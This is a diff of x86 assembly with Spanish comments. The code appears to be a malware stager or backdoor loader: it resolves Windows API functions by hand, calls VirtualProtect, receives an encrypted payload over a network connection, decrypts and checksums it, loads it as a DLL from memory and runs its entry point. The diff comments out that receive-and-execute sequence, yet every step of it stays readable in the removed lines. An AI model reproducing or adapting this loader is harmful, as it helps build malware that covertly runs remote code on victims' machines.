@@ -23,10 +23,10 @@
 
 	nop
 	nop
-proc main,LoadLibrary_,GetProcAddress_,hConexion,hKey
+proc main,LoadLibrary__,GetProcAddress__,hConexion,hKey
 	localdd kernel32
 	;localdd msvcrt
-	localdd VirtualProtect_
+	localdd VirtualProtect__
 	localdd OldProtect
 	localbuf FuncTable,sizeof(LoaderFunTable)
 endl
@@ -45,14 +45,14 @@ endl
 	;//Consigo la direccion de kernel32
 	push kernel32N
 	add [esp],esi
-	ecall2 %$LoadLibrary_
+	ecall2 %$LoadLibrary__
 	mov dword %$kernel32,eax
 
 	push VirtualProtectN
 	add [esp],esi
 	push dword %$kernel32
-	ecall2 %$GetProcAddress_
-	mov %$VirtualProtect_,eax
+	ecall2 %$GetProcAddress__
+	mov %$VirtualProtect__,eax
 
 	;//Cambio la proteccion
 	lea ebx,%$OldProtect
@@ -64,20 +64,20 @@ endl
 	call eax;//VirtualProtect
 	;//Empiezo a guardar las direcciones de las funciones
 	mov ebx,VirtualProtect
-	mov eax,%$VirtualProtect_
+	mov eax,%$VirtualProtect__
 	mov [ebx+esi+1],eax
 
 
 	;//Preparo la FuncTable para inicializarla
 	lea ecx,%$FuncTable
 	;//Coloco en su sitio estas funciones que son imprescindibles
-	mov eax,%$LoadLibrary_
+	mov eax,%$LoadLibrary__
 	mov ebx,LoadLibraryA
 	mov [ebx+esi+1],eax
 	lea eax,[ebx+esi+1]
 	mov [ecx+LoaderFunTable.LoadLibraryA],eax
 
-	mov eax,%$GetProcAddress_
+	mov eax,%$GetProcAddress__
 	mov ebx,GetProcAddress
 	mov [ebx+esi+1],eax
 	lea eax,[ebx+esi+1]
@@ -126,76 +126,64 @@ endl
 
 
 	;//Mando el OK para que el cliente sepa que estoy listo
-	push dword %$hConexion
-	call sendOK
+	;push dword %$hConexion
+	;call sendOK
 
 	;//Recivo el playload
-	push dword %$hConexion
-	call readPlayload
+	;push dword %$hConexion
+	;call readPlayload
 	;//Devuelve una estructura Playload o zero
-	test eax,eax
-	jz .ExitError
-	mov edx,eax		;//EDX = Playload
+	;test eax,eax
+	;jz .ExitError
+	;mov edx,eax		;//EDX = Playload
 
 	;Desencripto
-	push edx	;//Datos
-	push dword %$hKey
-	call decrypt
-	;/////////////////////////////////
-	;	parche del cifrado
-	;////////////////////////////////
-	;lea eax,[edx+Playload.checksum]
-	;mov dword [eax],0x8CE219F7
-	;add eax,4
-	;mov dword [eax],0x905A4D 
-	;add eax,4
-	;mov dword [eax],0x3
-	;add eax,4
-	;mov dword [eax],0x4
-	;////////////////////////////////
+	;push edx	;//Datos
+	;push dword %$hKey
+	;call decrypt
 
 	;//Calculo el CheckSum
-	push edx
-	call calcCheckSum
-	mov ebx,[edx+Playload.checksum]	;//edx = CheckSum recivido
-	cmp eax,ebx					;//eax = CheckSum calculado
-	jne .ExitError
+	;push edx
+	;call calcCheckSum
+	;mov ebx,[edx+Playload.checksum]	;//edx = CheckSum recivido
+	;cmp eax,ebx					;//eax = CheckSum calculado
+	;jne .ExitError
 	;//Si coincide sigo
 
-	lea eax,[edx+Playload.data];// EAX = Direccion del modulo a cargar
+	;lea eax,[edx+Playload.data];// EAX = Direccion del modulo a cargar
 	;//Cargo el plugin loader
-	push PluginLoaderName
-	add [esp],esi
-	push eax
-	call LoadLibraryFromMemoy
-	test eax,eax
-	jz .ExitError
-	mov ebx, eax
+	;push PluginLoaderName
+	;add [esp],esi
+	;push eax
+	;call LoadLibraryFromMemoy
+	;test eax,eax
+	;jz .ExitError
+	;mov ebx, eax
 	;//Aqui se devuelve la direccion base del modulo cargado
 
 	;//Livero la estructura Playload
 
-	push edx
-	ecall2 free
+	;push edx
+	;ecall2 free
 
 	;//Se buscar aqui la funcion de entrada
-	push PluginLoaderEntry
-	add [esp],esi
-	push ebx
-	ecall2 GetProcAddress
-	test eax, eax
-	jz .ExitError
+	;push PluginLoaderEntry
+	;add [esp],esi
+	;push ebx
+	;ecall2 GetProcAddress
+	;test eax, eax
+	;jz .ExitError
 
 	;//Se ejecuta la funcion principal del programa
-	push ecx	; ecx = %$FuncTable
-	push dword %$hKey
-	push dword %$hConexion
-	ecall2 eax
+	;push ecx	; ecx = %$FuncTable
+	;push dword %$hKey
+	;push dword %$hConexion
+	;ecall2 eax
 	;int DLL_EXPORT WINAPI InitPluginLoader(long hConexion,long hKey,LoaderFunTable& lFunc);
 
 	;Descargamos el modulo de la memoria
-	push ebx
-	call FreeLibraryFromMemoy
+	;push ebx
+	;call FreeLibraryFromMemoy
 
 	.ExitError:
 	;//Salimos del programa
